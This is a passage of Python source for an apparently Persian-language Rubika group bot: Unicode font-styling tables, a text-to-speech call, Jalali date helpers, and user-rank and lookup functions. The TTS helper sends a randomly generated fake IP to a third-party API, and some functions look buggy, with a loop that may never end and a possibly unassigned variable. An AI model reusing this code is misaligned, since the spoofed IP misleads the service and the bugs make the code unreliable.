        Eg31 = ['α', 'ɓ', '૮', '∂', 'ε', 'ƒ', 'ɠ', 'ɦ', 'เ', 'ʝ', 'ҡ', 'ℓ', 'ɱ', 'ɳ', 'σ', 'ρ', 'φ', '૨', 'ร', 'ƭ', 'µ', 'ѵ', 'ω', 'א', 'ყ', 'ƶ', 'α', 'ɓ', '૮', '∂', 'ε', 'ƒ', 'ɠ', 'ɦ', 'เ', 'ʝ', 'ҡ', 'ℓ', 'ɱ', 'ɳ', 'σ', 'ρ', 'φ', '૨', 'ร', 'ƭ', 'µ', 'ѵ', 'ω', 'א', 'ყ', 'ƶ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg32 = ['ƛ', 'Ɓ', 'Ƈ', 'Ɗ', 'Є', 'Ƒ', 'Ɠ', 'Ӈ', 'Ɩ', 'ʆ', 'Ƙ', 'Լ', 'M', 'Ɲ', 'Ơ', 'Ƥ', 'Ƣ', 'Ʀ', 'Ƨ', 'Ƭ', 'Ʋ', 'Ɣ', 'Ɯ', 'Ҳ', 'Ƴ', 'Ȥ', 'ƛ', 'Ɓ', 'Ƈ', 'Ɗ', 'Є', 'Ƒ', 'Ɠ', 'Ӈ', 'Ɩ', 'ʆ', 'Ƙ', 'Լ', 'M', 'Ɲ', 'Ơ', 'Ƥ', 'Ƣ', 'Ʀ', 'Ƨ', 'Ƭ', 'Ʋ', 'Ɣ', 'Ɯ', 'Ҳ', 'Ƴ', 'Ȥ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg33 = ['ค', 'ც', '८', 'ძ', '૯', 'Բ', '૭', 'Һ', 'ɿ', 'ʆ', 'қ', 'Ն', 'ɱ', 'Ո', '૦', 'ƿ', 'ҩ', 'Ր', 'ς', '੮', 'υ', '౮', 'ω', '૪', 'ע', 'ઽ', 'ค', 'ც', '८', 'ძ', '૯', 'Բ', '૭', 'Һ', 'ɿ', 'ʆ', 'қ', 'Ն', 'ɱ', 'Ո', '૦', 'ƿ', 'ҩ', 'Ր', 'ς', '੮', 'υ', '౮', 'ω', '૪', 'ע', 'ઽ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg34 = ['α', 'ß', 'ς', 'd', 'ε', 'ƒ', 'g', 'h', 'ï', 'յ', 'κ', 'ﾚ', 'm', 'η', '⊕', 'p', 'Ω', 'r', 'š', '†', 'u', '∀', 'ω', 'x', 'ψ', 'z', 'α', 'ß', 'ς', 'd', 'ε', 'ƒ', 'g', 'h', 'ï', 'յ', 'κ', 'ﾚ', 'm', 'η', '⊕', 'p', 'Ω', 'r', 'š', '†', 'u', '∀', 'ω', 'x', 'ψ', 'z', '𝟙', 'ϩ', 'Ӡ', '५', 'Ƽ', 'Ϭ', '7', '𝟠', '९', '⊘']
        Eg35 = ['Λ', 'B', 'ᄃ', 'D', 'Σ', 'F', 'G', 'Ή', 'I', 'J', 'K', 'ᄂ', 'M', 'П', 'Ө', 'P', 'Q', 'Я', 'Ƨ', 'Ƭ', 'Ц', 'V', 'Щ', 'X', 'Y', 'Z', 'Λ', 'B', 'ᄃ', 'D', 'Σ', 'F', 'G', 'Ή', 'I', 'J', 'K', 'ᄂ', 'M', 'П', 'Ө', 'P', 'Q', 'Я', 'Ƨ', 'Ƭ', 'Ц', 'V', 'Щ', 'X', 'Y', 'Z', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg36 = ['α', 'в', '¢', '∂', 'є', 'ƒ', 'g', 'н', 'ι', 'נ', 'к', 'ℓ', 'м', 'η', 'σ', 'ρ', 'q', 'я', 'ѕ', 'т', 'υ', 'ν', 'ω', 'χ', 'у', 'z', 'α', 'в', '¢', '∂', 'є', 'ƒ', 'g', 'н', 'ι', 'נ', 'к', 'ℓ', 'м', 'η', 'σ', 'ρ', 'q', 'я', 'ѕ', 'т', 'υ', 'ν', 'ω', 'χ', 'у', 'z', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg37 = ['Ⱥ', 'β', '↻', 'Ꭰ', 'Ɛ', 'Ƒ', 'Ɠ', 'Ƕ', 'į', 'ل', 'Ҡ', 'Ꝉ', 'Ɱ', 'ហ', 'ට', 'φ', 'Ҩ', 'འ', 'Ϛ', 'Ͳ', 'Ա', 'Ỽ', 'చ', 'ჯ', 'Ӌ', 'ɀ', 'ą', 'ҍ', 'ç', 'ժ', 'ҽ', 'ƒ', 'ց', 'հ', 'ì', 'ʝ', 'ҟ', 'Ӏ', 'ʍ', 'ղ', 'օ', 'ք', 'զ', 'ɾ', 'ʂ', 'է', 'մ', 'ѵ', 'ա', '×', 'վ', 'Հ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg38 = ['ᗩ', 'ᗷ', 'ᑕ', 'ᗪ', 'E', 'ᖴ', 'G', 'ᕼ', 'I', 'ᒍ', 'K', 'ᒪ', 'ᗰ', 'ᑎ', 'O', 'ᑭ', 'ᑫ', 'ᖇ', 'ᔕ', 'T', 'ᑌ', 'ᐯ', 'ᗯ', '᙭', 'Y', 'ᘔ', 'ᗩ', 'ᗷ', 'ᑕ', 'ᗪ', 'E', 'ᖴ', 'G', 'ᕼ', 'I', 'ᒍ', 'K', 'ᒪ', 'ᗰ', 'ᑎ', 'O', 'ᑭ', 'ᑫ', 'ᖇ', 'ᔕ', 'T', 'ᑌ', 'ᐯ', 'ᗯ', '᙭', 'Y', 'ᘔ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg39 = ['ᗩ', 'ᗷ', 'ᑢ', 'ᕲ', 'ᘿ', 'ᖴ', 'ᘜ', 'ᕼ', 'ᓰ', 'ᒚ', 'ᖽᐸ', 'ᒪ', 'ᘻ', 'ᘉ', 'ᓍ', 'ᕵ', 'ᕴ', 'ᖇ', 'S', 'ᖶ', 'ᑘ', 'ᐺ', 'ᘺ', '᙭', 'ᖻ', 'ᗱ', 'ᗩ', 'ᗷ', 'ᑢ', 'ᕲ', 'ᘿ', 'ᖴ', 'ᘜ', 'ᕼ', 'ᓰ', 'ᒚ', 'ᖽᐸ', 'ᒪ', 'ᘻ', 'ᘉ', 'ᓍ', 'ᕵ', 'ᕴ', 'ᖇ', 'S', 'ᖶ', 'ᑘ', 'ᐺ', 'ᘺ', '᙭', 'ᖻ', 'ᗱ', '𝟙', 'ϩ', 'Ӡ', '५', 'Ƽ', 'Ϭ', '7', '𝟠', '९', '⊘']
        Eg40 = ['ꍏ', '♭', '☾', '◗', '€', 'Ϝ', '❡', '♄', '♗', '♪', 'ϰ', '↳', '♔', '♫', '⊙', 'ρ', '☭', '☈', 'ⓢ', '☂', '☋', '✓', 'ω', '⌘', '☿', '☡', 'ꍏ', '♭', '☾', '◗', '€', 'Ϝ', '❡', '♄', '♗', '♪', 'ϰ', '↳', '♔', '♫', '⊙', 'ρ', '☭', '☈', 'ⓢ', '☂', '☋', '✓', 'ω', '⌘', '☿', '☡', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg41 = ['♬', 'ᖲ', '¢', 'ᖱ', '៩', '⨏', '❡', 'Ϧ', 'ɨ', 'ɉ', 'ƙ', 'ɭ', '៣', '⩎', '០', 'ᖰ', 'ᖳ', 'Ʀ', 'ន', 'Ƭ', '⩏', '⩔', 'Ɯ', '✗', 'ƴ', 'Ȥ', '♬', 'ᖲ', '¢', 'ᖱ', '៩', '⨏', '❡', 'Ϧ', 'ɨ', 'ɉ', 'ƙ', 'ɭ', '៣', '⩎', '០', 'ᖰ', 'ᖳ', 'Ʀ', 'ន', 'Ƭ', '⩏', '⩔', 'Ɯ', '✗', 'ƴ', 'Ȥ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg42 = ['Δ', '𝓫', '℃', 'ⓓ', '𝐄', 'ℱ', 'ｇ', 'н', 'ί', 'Ⓙ', '𝐊', '𝐥', '๓', 'Ň', 'σ', 'ⓟ', 'Ω', '𝓡', 'ˢ', '𝓽', '𝐔', '𝕍', 'ω', '𝕏', '𝕪', 'Ⓩ', '卂', '𝐁', '匚', 'ᵈ', '𝐄', '𝓕', '𝔤', 'ℍ', 'ί', '𝒿', '𝓀', '𝔩', '𝓂', 'ή', '𝓞', 'ℙ', 'q', 'ŕ', '𝐬', 'Ť', 'Ｕ', '𝕍', 'ⓦ', '𝕩', '𝕪', 'Ž', '❶', '❷', '３', '➃', '５', '❻', '７', '❽', '➈', 'Ѳ']
        Eg43 = ['ꍏ', 'ꌃ', 'ꉓ', 'ꀸ', 'ꍟ', 'ꎇ', 'ꁅ', 'ꃅ', 'ꀤ', 'ꀭ', 'ꀘ', '꒒', 'ꂵ', 'ꈤ', 'ꂦ', 'ꉣ', 'ꆰ', 'ꋪ', 'ꌗ', '꓄', 'ꀎ', 'ꃴ', 'ꅏ', 'ꊼ', 'ꌩ', 'ꁴ', 'ꍏ', 'ꌃ', 'ꉓ', 'ꀸ', 'ꍟ', 'ꎇ', 'ꁅ', 'ꃅ', 'ꀤ', 'ꀭ', 'ꀘ', '꒒', 'ꂵ', 'ꈤ', 'ꂦ', 'ꉣ', 'ꆰ', 'ꋪ', 'ꌗ', '꓄', 'ꀎ', 'ꃴ', 'ꅏ', 'ꊼ', 'ꌩ', 'ꁴ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg44 = ['ꋬ', 'ꃳ', 'ꉔ', '꒯', 'ꏂ', 'ꊰ', 'ꍌ', 'ꁝ', '꒐', '꒻', 'ꀘ', '꒒', 'ꂵ', 'ꋊ', 'ꄲ', 'ꉣ', 'ꆰ', 'ꋪ', 'ꇙ', '꓄', '꒤', '꒦', 'ꅐ', 'ꉧ', 'ꌦ', 'ꁴ', 'ꋬ', 'ꃳ', 'ꉔ', '꒯', 'ꏂ', 'ꊰ', 'ꍌ', 'ꁝ', '꒐', '꒻', 'ꀘ', '꒒', 'ꂵ', 'ꋊ', 'ꄲ', 'ꉣ', 'ꆰ', 'ꋪ', 'ꇙ', '꓄', '꒤', '꒦', 'ꅐ', 'ꉧ', 'ꌦ', 'ꁴ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg45 = ['ꋫ', 'ꃃ', 'ꏸ', 'ꁕ', 'ꍟ', 'ꄘ', 'ꁍ', 'ꑛ', 'ꂑ', 'ꀭ', 'ꀗ', '꒒', 'ꁒ', 'ꁹ', 'ꆂ', 'ꉣ', 'ꁸ', '꒓', 'ꌚ', '꓅', 'ꐇ', 'ꏝ', 'ꅐ', 'ꇓ', 'ꐟ', 'ꁴ', 'ꋫ', 'ꃃ', 'ꏸ', 'ꁕ', 'ꍟ', 'ꄘ', 'ꁍ', 'ꑛ', 'ꂑ', 'ꀭ', 'ꀗ', '꒒', 'ꁒ', 'ꁹ', 'ꆂ', 'ꉣ', 'ꁸ', '꒓', 'ꌚ', '꓅', 'ꐇ', 'ꏝ', 'ꅐ', 'ꇓ', 'ꐟ', 'ꁴ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg46 = ['ꋬ', 'ꍗ', 'ꏳ', 'ꂟ', 'ꏂ', 'ꄟ', 'ꍌ', 'ꃬ', '꒐', '꒻', 'ꀘ', '꒒', 'ꂵ', 'ꂚ', 'ꉻ', 'ꉣ', 'ꋠ', 'ꋪ', 'ꑄ', '꓄', 'ꀎ', '꒦', 'ꅐ', 'ꉼ', 'ꐞ', 'ꑓ', 'ꋬ', 'ꍗ', 'ꏳ', 'ꂟ', 'ꏂ', 'ꄟ', 'ꍌ', 'ꃬ', '꒐', '꒻', 'ꀘ', '꒒', 'ꂵ', 'ꂚ', 'ꉻ', 'ꉣ', 'ꋠ', 'ꋪ', 'ꑄ', '꓄', 'ꀎ', '꒦', 'ꅐ', 'ꉼ', 'ꐞ', 'ꑓ', '0', '6', '8', ',ㄥ,', '9', 'ގ', 'ㄣ', 'Ɛ', 'ᄅ', '⇂']
        Eg47 = ['ꁲ', 'ꃃ', 'ꇃ', 'ꂡ', 'ꏹ', 'ꄙ', 'ꁍ', 'ꀍ', 'ꀤ', 'ꀭ', 'ꈵ', '꒒', 'ꂵ', 'ꋊ', 'ꁏ', 'ꉣ', 'ꆰ', 'ꋪ', 'ꌗ', 'ꋖ', 'ꌈ', 'ꃴ', 'ꅏ', 'ꋚ', 'ꂖ', 'ꁴ', 'ꁲ', 'ꃃ', 'ꇃ', 'ꂡ', 'ꏹ', 'ꄙ', 'ꁍ', 'ꀍ', 'ꀤ', 'ꀭ', 'ꈵ', '꒒', 'ꂵ', 'ꋊ', 'ꁏ', 'ꉣ', 'ꆰ', 'ꋪ', 'ꌗ', 'ꋖ', 'ꌈ', 'ꃴ', 'ꅏ', 'ꋚ', 'ꂖ', 'ꁴ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg48 = ['ል', 'ጌ', 'ር', 'ዕ', 'ቿ', 'ቻ', 'ኗ', 'ዘ', 'ጎ', 'ጋ', 'ጕ', 'ረ', 'ጠ', 'ክ', 'ዐ', 'የ', 'ዒ', 'ዪ', 'ነ', 'ፕ', 'ሁ', 'ሀ', 'ሠ', 'ሸ', 'ሃ', 'ጊ', 'ል', 'ጌ', 'ር', 'ዕ', 'ቿ', 'ቻ', 'ኗ', 'ዘ', 'ጎ', 'ጋ', 'ጕ', 'ረ', 'ጠ', 'ክ', 'ዐ', 'የ', 'ዒ', 'ዪ', 'ነ', 'ፕ', 'ሁ', 'ሀ', 'ሠ', 'ሸ', 'ሃ', 'ጊ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg49 = ['А', 'Б', 'C', 'Д', 'Є', 'F', 'G', 'H', 'Ї', 'J', 'К', 'Г', 'Ѫ', 'Й', 'Ѳ', 'P', 'Ф', 'Я', '', 'T', 'Ц', 'Ѵ', 'Ш', 'Ж', 'Ч', 'З', 'а', 'б', 'c', 'д', 'ё', 'f', 'g', 'н', 'ї', 'j', 'к', 'г', 'ѫ', 'п', 'ѳ', 'p', 'ф', 'я', '', 'т', 'ц', 'ѵ', 'щ', 'ж', 'ч', 'з', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg50 = ['Д', 'Ᏸ', 'ℂ', '∂', 'Ǝ', 'ƒ', 'Ꮆ', 'ℍ', 'î', 'ʝ', 'Ƙ', 'ℓ', 'ℳ', 'И', 'ø', 'ρ', 'Ǫ', 'Я', 'Ƨ', '✞', 'υ', 'ϑ', 'Ꮤ', '✘', 'У', 'Հ', 'Д', 'Ᏸ', 'ℂ', '∂', 'Ǝ', 'ƒ', 'Ꮆ', 'ℍ', 'î', 'ʝ', 'Ƙ', 'ℓ', 'ℳ', 'И', 'ø', 'ρ', 'Ǫ', 'Я', 'Ƨ', '✞', 'υ', 'ϑ', 'Ꮤ', '✘', 'У', 'Հ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg51 = ['Д', 'Б', 'C', 'D', 'Ξ', 'F', 'G', 'H', 'I', 'J', 'Ҝ', 'L', 'M', 'И', 'Ф', 'P', 'Ǫ', 'Я', 'S', 'Γ', 'Ц', 'V', 'Щ', 'Ж', 'У', 'Z', 'Д', 'Б', 'C', 'D', 'Ξ', 'F', 'G', 'H', 'I', 'J', 'Ҝ', 'L', 'M', 'И', 'Ф', 'P', 'Ǫ', 'Я', 'S', 'Γ', 'Ц', 'V', 'Щ', 'Ж', 'У', 'Z', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg52 = ['卂', '乃', '匚', 'ᗪ', '乇', '千', 'Ꮆ', '卄', '丨', 'ﾌ', 'Ҝ', 'ㄥ', '爪', '几', 'ㄖ', '卩', 'Ɋ', '尺', '丂', 'ㄒ', 'ㄩ', 'ᐯ', '山', '乂', 'ㄚ', '乙', '卂', '乃', '匚', 'ᗪ', '乇', '千', 'Ꮆ', '卄', '丨', 'ﾌ', 'Ҝ', 'ㄥ', '爪', '几', 'ㄖ', '卩', 'Ɋ', '尺', '丂', 'ㄒ', 'ㄩ', 'ᐯ', '山', '乂', 'ㄚ', '乙', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg53 = ['₳', '฿', '₵', 'Đ', 'Ɇ', '₣', '₲', 'Ⱨ', 'ł', 'J', '₭', 'Ⱡ', '₥', '₦', 'Ø', '₱', 'Q', 'Ɽ', '₴', '₮', 'Ʉ', 'V', '₩', 'Ӿ', 'Ɏ', 'Ⱬ', '₳', '฿', '₵', 'Đ', 'Ɇ', '₣', '₲', 'Ⱨ', 'ł', 'J', '₭', 'Ⱡ', '₥', '₦', 'Ø', '₱', 'Q', 'Ɽ', '₴', '₮', 'Ʉ', 'V', '₩', 'Ӿ', 'Ɏ', 'Ⱬ', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg54 = ['z', 'ʎ', 'x', 'ʍ', 'ʌ', 'n', 'ʇ', 's', 'ɹ', 'b', 'd', 'o', 'u', 'ɯ', 'l', 'ʞ', 'ɾ', 'ı', 'ɥ', 'ɓ', 'ɟ', 'ǝ', 'p', 'ɔ', 'q', 'ɐ', 'Z', '⅄', 'X', 'M', 'Λ', '∩', '⊥', 'S', 'ᴚ', 'Ό', 'Ԁ', 'O', 'N', 'W', '˥', '⋊', 'ſ', 'I', 'H', '⅁', 'Ⅎ', 'Ǝ', 'ᗡ', 'Ɔ', 'ᙠ', '∀', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        Eg55 = ['҉A҉', '҉B҉', '҉C҉', '҉D҉', '҉E҉', '҉F҉', '҉G҉', '҉H҉', '҉I҉', '҉J҉', '҉K҉', '҉L҉', '҉M҉', '҉N҉', '҉O҉', '҉P҉', '҉Q҉', '҉R҉', '҉S҉', '҉T҉', '҉U҉', '҉V҉', '҉W҉', '҉X҉', '҉Y҉', '҉Z҉', '҉a҉', '҉b҉', '҉c҉', '҉d҉', '҉e҉', '҉f҉', '҉g҉', '҉h҉', '҉i҉', '҉j҉', '҉k҉', '҉l҉', '҉m҉', '҉n҉', '҉o҉', '҉p҉', '҉q҉', '҉r҉', '҉s҉', '҉t҉', '҉u҉', '҉v҉', '҉w҉', '҉x҉', '҉y҉', '҉z҉', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹', '⁰']
        ALLEg = [Eg1, Eg2, Eg3, Eg4, Eg5, Eg6, Eg7, Eg8, Eg9, Eg10, Eg11, Eg12, Eg13, Eg14, Eg15, Eg16, Eg17, Eg18, Eg19, Eg20, Eg21, Eg22, Eg23, Eg24, Eg25, Eg26, Eg27, Eg28, Eg29, Eg30, Eg31, Eg32, Eg33, Eg34, Eg35, Eg36, Eg37, Eg38, Eg39, Eg40, Eg41, Eg42, Eg43, Eg44, Eg45, Eg46, Eg47, Eg48, Eg49, Eg50, Eg51, Eg52, Eg53, Eg54, Eg55]
        ATZ = {'A': 0, 'B': 1, 'C': 2, 'D': 3, 'E': 4, 'F': 5, 'G': 6, 'H': 7, 'I': 8, 'J': 9, 'K': 10, 'L': 11, 'M': 12, 'N': 13, 'O': 14, 'P': 15, 'Q': 16, 'R': 17, 'S': 18, 'T': 19, 'U': 20, 'V': 21, 'W': 22, 'X': 23, 'Y': 24, 'Z': 25, 'a': 26, 'b': 27, 'c': 28, 'd': 29, 'e': 30, 'f': 31, 'g': 32, 'h': 33, 'i': 34, 'j': 35, 'k': 36, 'l': 37, 'm': 38, 'n': 39, 'o': 40, 'p': 41, 'q': 42, 'r': 43, 's': 44, 't': 45, 'u': 46, 'v': 47, 'w': 48, 'x': 49, 'y': 50, 'z': 51, '1': 52, '2': 53, '3': 54, '4': 55, '5': 56, '6': 57, '7': 58, '8': 59, '9': 60, '0': 61}
        result = []
        for EG in ALLEg:
            new = ''
            for ch in text:
                isok = True
                if ch in ATZ:
                    idx = ATZ[ch]
                    if idx <= len(EG) - 1:
                        new += EG[idx]
                        isok = False
                if isok:
                    new += ch
            result.append(new)
        return result

    def voice_AI(text, jensiat, name_file):
        try:
            import base64
            ip = f'{random.randint(100, 200)}.{random.randint(100, 200)}.{random.randint(100, 200)}.{random.randint(100, 200)}'
            data = {'locale': 'fa-IR', 'content': f'<voice name="fa-IR-{jensiat}"> {text} </voice>', 'ip': ip}
            response = requests.post('https://app.micmonster.com/restapi/create', json=data, timeout=30)
            audio_data = base64.b64decode(response.text)
            with open(name_file, 'wb') as f:
                f.write(audio_data)
            return True
        except Exception:
            return False

    def Week(timestamp=None):
        if timestamp is None:
            timestamp = get_iran_timestamp()
        dt_obj = jdatetime.datetime.fromtimestamp(timestamp)
        days = ['شنبه', 'یکشنبه', 'دوشنبه', 'سه\u200cشنبه', 'چهارشنبه', 'پنج\u200cشنبه', 'جمعه']
        return days[dt_obj.weekday()]

    def Hour(timestamp=None):
        if timestamp is None:
            timestamp = get_iran_timestamp()
        dt_obj = jdatetime.datetime.fromtimestamp(timestamp)
        return dt_obj.strftime('%H:%M:%S')

    def Year(timestamp=None):
        if timestamp is None:
            timestamp = get_iran_timestamp()
        dt_obj = jdatetime.datetime.fromtimestamp(timestamp)
        return dt_obj.year

    def Month(timestamp=None):
        if timestamp is None:
            timestamp = get_iran_timestamp()
        dt_obj = jdatetime.datetime.fromtimestamp(timestamp)
        return dt_obj.month

    def Day(timestamp=None):
        if timestamp is None:
            timestamp = get_iran_timestamp()
        dt_obj = jdatetime.datetime.fromtimestamp(timestamp)
        return dt_obj.day

    def Date(timestamp=None):
        if timestamp is None:
            timestamp = get_iran_timestamp()
        dt_obj = jdatetime.datetime.fromtimestamp(timestamp)
        return f'{dt_obj.year}-{dt_obj.month}-{dt_obj.day}'

    def Time_pass(time):
        if time < 0:
            time *= -1
            negative = '-'
        else:
            negative = ''
        if time < 60:
            time_pass = f'{negative}{round(time, 2)} ثانیه'
        elif time < 3600:
            time_pass = f'{negative}{round(time / 60, 2)} دقیقه'
        elif time < 86400:
            time_pass = f'{negative}{round(time / 3600, 2)} ساعت'
        else:
            time_pass = f'{negative}{round(time / 86400, 2)} روز'
        return time_pass

    def getInfoUser(object_guid, user_guid, info='ناشناس'):

        first_name, user = ('بدون لقب', False)
        try:
            user = client.get_chat_info(user_guid)['user']
        except Exception as e:
            pass
        if user:
            if 'first_name' in user:
                first_name = user['first_name']
        if user:
            if 'last_name' in user:
                first_name = user['last_name']
        USERS[object_guid][user_guid] = [0, 0, first_name, info]
        return None

    def check_name(object_guid, user_guid):
        if user_guid not in USERS[object_guid]:
            USERS[object_guid][user_guid] = [0, 0, 'بدون لقب', 'ناشناس']
        first_name = USERS[object_guid][user_guid][2]
        if first_name == 'اراذل':
            first_name = ('بدون لقب', False)[0]
        try:
            user = client.get_chat_info(user_guid)['user']
        except Exception:
            pass
        if user:
            if 'first_name' in user:
                first_name = user['first_name']
            elif 'last_name' in user:
                first_name = user['last_name']
        if USERS[object_guid][user_guid][2] in ['بدون لقب', 'اراذل', 'ناشناس']:
            USERS[object_guid][user_guid][2] = first_name
        return first_name

    def manage_info(user):
        mess = ''
        if 'first_name' in user:
            mess += MPro(f"اسم : {user['first_name']}")
        if 'last_name' in user:
            mess += MPro(f"فامیلی : {user['last_name']}")
        if 'username' in user:
            mess += MPro(f"آیدی : @{user['username']}")
        if 'last_online' in user:
            last_online = str(jdatetime.datetime.fromtimestamp(int(user['last_online'])))
            mess += MPro(f'آخرین بازدید : {last_online}')
        return mess

    def resetUser(user_guid, object_guid):
        if user_guid in JoindUsers[object_guid]:
            JoindUsers[object_guid].remove(user_guid)
        if user_guid in USERS[object_guid]:
            USERS[object_guid][user_guid][1] = 0
            return None
        return None

    def formInfo(prs, OBJM=None, guid_=None):
        countms = prs[0]
        countwr = prs[1]
        nickname = prs[2]
        infouser = prs[3]
        if not nickname:
            nickname = 'تنظیم نشده'
        mess = MPro(f'لقب : {nickname}')
        mess += MPro(f'اصل : {infouser}')
        mess += MPro(f'تعداد پیام : {countms}')
        mess += MPro(f'تعداد اخطار : {countwr}')
        return mess

    def formrank(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, guid_sender, type=False):
        rank = validatUser(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, guid_sender)
        if rank == 4:
            return 'سازنده 💀\u200d👁\u200d'
        elif rank == 3:
            return 'مالک 👑\u200d'
        elif rank == 2:
            return 'ادمین ویژه ⭐'
        elif rank == 1:
            return 'ادمین ✨'
        elif type:
            return ''
        else:
            return 'کاربر عادی 👤'

    def Rank_user(rank, OBJM):
        if rank.startswith('u0'):
            if OBJM['object_guid'] in USERS and rank in USERS[OBJM['object_guid']]:
                return USERS[OBJM['object_guid']][rank][2]
        try:
            rank = int(rank)
        except ValueError:
            return None
        if rank == 4:
            return 'سازنده 💀\u200d👑\u200d'
        elif rank == 3:
            return 'مالک \u200d👑\u200d'
        elif rank == 2:
            return 'ادمین ویژه ⭐'
        elif rank == 1:
            return 'ادمین ✨'
        return 'کاربر عادی 👤'

    def validatUser(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, guid_sender):
        TIP = 0
        if guid_sender == Coder:
            TIP = 4
        elif guid_sender == OWNER:
            TIP = 4
        elif guid_sender == HOWNER:
            TIP = 3
        elif guid_sender in FULL_ADMINS:
            TIP = 2
        elif guid_sender in ADMINS:
            TIP = 1
        return TIP

    def get_reply_text(OBJM, object_guid, is_reply_message):
        prt = {}
        prt['ok'] = False
        if not is_reply_message:
            return prt
        reply_message = GetInfoByMessageId(object_guid, is_reply_message)
        if reply_message:
            if 'text' in reply_message:
                prt['text'] = reply_message['text']
                prt['reply_message'] = reply_message
                prt['ok'] = True
            else:
                prt['text'] = MPro('روی پیام متنی ریپلای بزن. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
        else:
            prt['text'] = MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
        return prt

    def get_reply_info(object_guid, is_reply_message, OBJM):
        prt = {}
        prt['ok'] = False
        if not is_reply_message:
            return prt
        reply_message = GetInfoByMessageId(object_guid, is_reply_message)
        if reply_message:
            prt['reply_message'] = reply_message
            prt['ok'] = True
        else:
            prt['text'] = MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
        return prt

    def Get_guid(url):
        if url.startswith('@'):
            get_info = client.get_chat_info_by_username(url)
            if not get_info['exist']:
                return [False, 'سازنده تنظیم شده ناموجود است.']
            if get_info['type'] == 'User':
                guid = get_info['user']['user_guid']
                return [guid, 'user']
            elif get_info['type'] == 'Channel':
                guid = get_info['channel']['channel_guid']
                return [guid, 'channel']
            else:
                return [False, 'اینفو دریافتی نامشخص است.']
        elif url.startswith('https://rubika.ir/'):
            if url.startswith('https://rubika.ir/joing/'):
                try:
                    get_info = client.get_chat_preview(url)
                    guid = get_info['group']['group_guid']
                    return [guid, 'group']
                except:
                    return [False, 'نتونستم اینفو گروه رو دریافت کنم.']
            elif url.startswith('https://rubika.ir/joinc/'):
                try:
                    get_info = client.get_chat_preview(url)
                    guid = get_info['channel']['channel_guid']
                    return [guid, 'channel']
                except:
                    return [False, 'نتونستم اینفو کانال رو دریافت کنم.']
            else:
                username = url.replace('https://rubika.ir/', '').strip()
                get_info = client.get_chat_info_by_username(username)
                if not get_info['exist']:
                    return [False, 'سازنده تنظیم شده ناموجود است.']
                if get_info['type'] == 'User':
                    guid = get_info['user']['user_guid']
                    return [guid, 'user']
                elif get_info['type'] == 'Channel':
                    guid = get_info['channel']['channel_guid']
                    return [guid, 'channel']
                else:
                    return [False, 'اینفو دریافتی نامشخص است.']
        elif url.startswith('u0'):
            return [url, 'user']
        elif url.startswith('g0'):
            return [url, 'group']
        elif url.startswith('c0'):
            return [url, 'channel']
        return [False, 'خطایی در دریافت اطلاعات رخ داد.']

    def getinfos(command, method=True):
        command = command.strip()
        reply_message_guid = False
        if method:
            try:
                reply_message_guid = client.get_chat_info_by_username(command.replace('@', ''))['user']['user_guid']
            except Exception as e:
                pass
        else:
            try:
                reply_message_guid = client.get_chat_info(command)['user']['user_guid']
            except Exception as e:
                pass
        return reply_message_guid

    def is_english_text(text):
        try:
            text = text.lower()
        except Exception:
            return False
        for x in TEGX:
            if x in text:
                return True
        return False

    def supper_command(command):
        if '///' not in command:
            return command
        start_cmd = command.split('///')[1]
        end_cmd = start_cmd.split('///')[0] if '///' in start_cmd else ''
        end_cmd_pass = f'///{end_cmd}///' if '///' in start_cmd else f'///{end_cmd}'
        special_cmd = command.replace(end_cmd_pass, command.replace('\n', '\\n'))
        command = command.replace(end_cmd_pass, special_cmd)
        while '///' in command:
            command = command.replace(end_cmd_pass, special_cmd)
        return command

    INFOS = {}
    SPEAKX = {}
    file_infos = 'Infos.json'
    FIRSTBOT = False
    file_infos_is = os.path.isfile(file_infos) if os else False
    if file_infos_is:
        try:
            with open(file_infos, 'r') as openfile:
                INFOS = json.load(openfile)
        except Exception:
            makeit = False
            try:
                with open('backup_INFOS.json', 'r') as openfile:
                    INFOS = json.load(openfile)
            except Exception:
                makeit = True
            if makeit:
                INFOS = {}
                with open(file_infos, 'w') as outfile:
                    json.dump(INFOS, outfile)
    else:
        FIRSTBOT = True
        with open(file_infos, 'w') as outfile:
            json.dump(INFOS, outfile)
    file_speak = 'Speak.json'
